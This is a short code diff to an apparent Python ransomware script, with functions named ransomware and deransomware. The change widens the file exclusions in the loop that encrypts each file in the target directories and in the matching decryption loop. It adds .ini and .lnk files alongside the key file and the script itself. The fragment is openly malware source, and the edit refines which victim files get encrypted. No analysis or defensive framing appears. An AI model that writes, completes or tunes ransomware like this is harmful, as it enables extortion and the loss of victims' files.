@@ -109,7 +109,7 @@ def ransomware(dirsToEncrypt):
         for file_path in walk_files(dirToEncrypt):
         
             # DON'T ENCRYPT THE KEY FILE OR THIS PIECE OF CODE!
-            if file_path != keyfilePath and ".py" not in file_path and "key.txt" not in file_path:
+            if file_path != keyfilePath and ".ini" not in file_path and ".lnk" not in file_path and ".py" not in file_path and "key.txt" not in file_path:
                 encrypt(file_path)
                 print(f"-> [{bcolors.FAIL}Encrypted{bcolors.ENDC}] [{bcolors.ORANGE}"+file_path+f"{bcolors.ENDC}]")
 
@@ -122,7 +122,7 @@ def deransomware(dirsToEncrypt):
         for file_path in walk_files(dirToEncrypt):
         
             # DON'T DECRYPT THE KEY FILE OR THIS PIECE OF CODE!
-            if file_path != keyfilePath and ".py" not in file_path and "key.txt" not in file_path:
+            if file_path != keyfilePath and ".ini" not in file_path and ".lnk" not in file_path and ".py" not in file_path and "key.txt" not in file_path:
                 decrypt(file_path)
                 print(f"-> [{bcolors.OKGREEN}Decrypted{bcolors.ENDC}] [{bcolors.OKCYAN}"+file_path+f"{bcolors.ENDC}]")
 
